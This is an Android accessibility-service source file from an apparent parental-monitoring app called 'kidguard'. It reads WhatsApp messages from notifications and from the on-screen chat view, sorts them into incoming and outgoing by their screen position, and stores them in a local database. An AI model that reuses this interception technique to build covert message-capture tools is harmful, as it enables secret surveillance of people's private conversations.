package com.kidguard.services;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.graphics.Rect;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.j256.ormlite.android.apptools.OpenHelperManager;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.stmt.QueryBuilder;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.WhatsApp;
import com.kidguard.orm.DatabaseHelper;
import com.kidguard.utilities.Utilities;

import java.sql.SQLException;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService implements Constant {
    private static final String TAG = MyAccessibilityService.class.getSimpleName();

    private String type;
    private String title;
    private String text;
    private String time;
    private DatabaseHelper databaseHelper = null;
    private Dao<WhatsApp, Integer> whatsAppDao;

    // Database Helper
    private DatabaseHelper getHelper() {
        if (databaseHelper == null) {
            databaseHelper = OpenHelperManager.getHelper(this, DatabaseHelper.class);
        }
        return databaseHelper;
    }

    // Initialize WhatsApp Dao
    private void initializeWhatsAppDao() {
        try {
            whatsAppDao = getHelper().getWhatsAppDao();
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    // On Accessibility Event
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        initializeWhatsAppDao();
        switch (event.getEventType()) {
            case REQUEST_CODE_NOTIFICATION:
                try {
                    getNotificationEvent(event);
                    return;
                } catch (Throwable e) {
                    e.printStackTrace();
                    return;
                }
            case REQUEST_CODE_READ_MESSAGE:
                try {
                    getDataEvent(event);
                    return;
                } catch (Throwable e2) {
                    e2.printStackTrace();
                    return;
                }
            default:
                break;
        }
    }

    // Get Notification Event For Read Message From Notification Using Accessibility Event.
    private void getNotificationEvent(AccessibilityEvent event) {
        Notification notification = (Notification) event.getParcelableData();
        title = notification.extras.getString("android.title");
        text = notification.extras.getString("android.text");
        time = Utilities.getTimeNotificationWA();
        type = TYPE_INCOMING;
        CharSequence[] lines = notification.extras.getCharSequenceArray("android.textLines");
        String substring;
        String charSequence;
        if (lines != null) {
            for (CharSequence msg : lines) {
                charSequence = msg.toString();
                int indexOff = charSequence.indexOf(":");
                if (indexOff != -1) {
                    substring = charSequence.substring(0, indexOff);
                    charSequence = charSequence.substring(indexOff + 1, charSequence.length());
                    title = substring;
                    text = charSequence;
                    //String groupName = null;
                    if (title.contains("@")) {
                        String[] parts = title.split("@");
                        title = parts[0];
                        //groupName = parts[1];
                    }
                    putMessagesIntoDB(title, text, time, type);

                } else {
                    text = charSequence;
                    putMessagesIntoDB(title, text, time, type);
                }
            }
        } else {

            putMessagesIntoDB(title, text, time, type);
        }
    }

    // Get Data Event For Read Messages From inside the Applications Using AccessibilityEvent.
    private void getDataEvent(AccessibilityEvent event) {
        if (TextUtils.equals(event.getClassName(), "android.widget.ListView")) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                AccessibilityNodeInfo parent = source.getParent();
                if (parent != null) {
                    if (TextUtils.equals(parent.getClassName(), "android.widget.FrameLayout")) {
                        AccessibilityNodeInfo child = parent.getChild(1);
                        AccessibilityNodeInfo child2 = child.getChild(0);
                        title = child2.getText().toString();
                        if (!TextUtils.isEmpty(title)) {
                            int childCount = source.getChildCount();
                            if (childCount > 0) {
                                AccessibilityNodeInfo child3 = source.getChild(childCount - 1);
                                int childCount2 = child3.getChildCount();
                                if (childCount2 == 3) {
                                    text = child3.getChild(1).getText().toString();
                                    time = child3.getChild(2).getText().toString();
                                    getRect(child3.getChild(1));
                                    child2.recycle();
                                    child.recycle();
                                    parent.recycle();
                                    source.recycle();
                                    return;
                                }

                                if (child3.getChildCount() >= 2) {
                                    for (childCount = 0; childCount <= childCount2; childCount++) {
                                        AccessibilityNodeInfo child4 = child3.getChild(childCount);
                                        child4.refresh();
                                        switch (childCount) {
                                            case 0:
                                                text = child4.getText().toString();
                                                break;
                                            case 1:
                                                time = child4.getText().toString();
                                                if (type.equals(TYPE_INCOMING)) {
                                                    child4.recycle();
                                                }
                                                break;
                                        }
                                        getRect(child4);
                                    }
                                }
                            }
                        }
                        child2.recycle();
                        child.recycle();
                    }
                    parent.recycle();
                }
                source.recycle();
            }
        }
    }

    // Getting Rect for set type messages are incoming or outgoing.
    private void getRect(AccessibilityNodeInfo child4) {
        Rect rect = new Rect();
        child4.getBoundsInScreen(rect);

        type = rect.left < 70 ? TYPE_INCOMING : TYPE_OUTGOING;

        // Only for tab model SM-T355Y
        if (Utilities.getDeviceModel().equals(TAB_MODEL)) {
            type = rect.left < 57 ? TYPE_INCOMING : TYPE_OUTGOING;
        }

        if (type.equals(TYPE_INCOMING) && time != null) {
            putMessagesIntoDB(title, text, time, type);
        } else if (type.equals(TYPE_OUTGOING) && time != null) {
            putMessagesIntoDB(title, text, time, type);
        }
        child4.recycle();
    }

    // Add Whats App Messages Into Database locally
    private void putMessagesIntoDB(String title, String text, String time, String type) {
        try {
            if (whatsAppDao != null) {
                if (whatsAppDao.isTableExists()) {
                    long numRows = whatsAppDao.countOf();
                    if (numRows != 0) {
                        QueryBuilder<WhatsApp, Integer> queryBuilder = whatsAppDao.queryBuilder();
                        List<WhatsApp> results = queryBuilder.where().eq(WhatsApp.WA_MESSAGE_TITLE, title.trim()).and().eq(WhatsApp.WA_MESSAGE_TEXT, text.trim()).and().eq(WhatsApp.WA_MESSAGE_TYPE, type.trim()).query();
                        if (results.size() == 0) {
                            setWhatsAppDataPOJO(title, text, time, type);
                        }
                    } else {
                        setWhatsAppDataPOJO(title, text, time, type);
                    }
                }
            }
        } catch (SQLException e) {
            Log.e(TAG, "SQLException???" + e.getMessage());
            e.printStackTrace();
        }
    }

    // Set WhatsApp Data into database using POJO
    private void setWhatsAppDataPOJO(String title, String text, String time, String type) {
        try {
            WhatsApp whatsApp = new WhatsApp();
            whatsApp.setWa_message_title(title.trim());
            whatsApp.setWa_message_text(text.trim());
            whatsApp.setWa_message_time(time.trim());
            whatsApp.setWa_message_type(type.trim());
            whatsAppDao.create(whatsApp);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    // onInterrupt
    @Override
    public void onInterrupt() {
        if (databaseHelper != null) {
            OpenHelperManager.releaseHelper();
            databaseHelper = null;
        }
    }

    // onServiceConnected
    @Override
    protected void onServiceConnected() {
        initializeWhatsAppDao();
    }
}